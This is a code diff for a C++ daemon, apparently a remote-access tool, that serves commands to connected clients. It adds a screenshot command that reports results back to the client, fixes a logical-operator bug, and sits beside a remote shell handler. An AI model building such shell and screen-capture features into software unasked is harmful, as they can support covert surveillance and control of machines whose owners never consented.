@@ -3,11 +3,13 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include "DaemonServer.hpp"
+#include <cstring>
 
-int shield_cmd_help(Client *client, DaemonServer *server, const char *args)
+#include "cmds/screenshot.inc.cc"
+
+int shield_cmd_help(Client *client, [[maybe_unused]] DaemonServer *server, const char *args)
 {
-	(void) server; // unused parameter
-	if (!args | !*args)
+	if (!args || !*args)
 	{
 		for (int i = 0; COMMANDS[i].command != NULL; ++i)
 		{
@@ -87,11 +89,24 @@ int	shield_cmd_shell(Client *client, DaemonServer *server, const char *args)
 	return (0);
 }
 
-int	shield_cmd_screenshot(Client *client, DaemonServer *server, const char *args)
-{
-	(void) client; // unused parameter
-	(void) server; // unused parameter
-	(void) args; // unused parameter
+int	shield_cmd_screenshot(
+	[[maybe_unused]] Client *client,
+	[[maybe_unused]] DaemonServer *server,
+	[[maybe_unused]] const char *args
+) {
+	const char *result = shield_screenshot();
+	if (std::strncmp(result, "ERROR|", 6) != 0)
+	{
+		client->output_buffer.append("Successfully took screenshot, saved to ");
+		client->output_buffer.append(result);
+		client->output_buffer.push_back('\n');
+	}
+	else
+	{
+		client->output_buffer.append("Failed to take screenshot: ");
+		client->output_buffer.append(result);
+		client->output_buffer.push_back('\n');
+	}
 	return (0);
 }
 
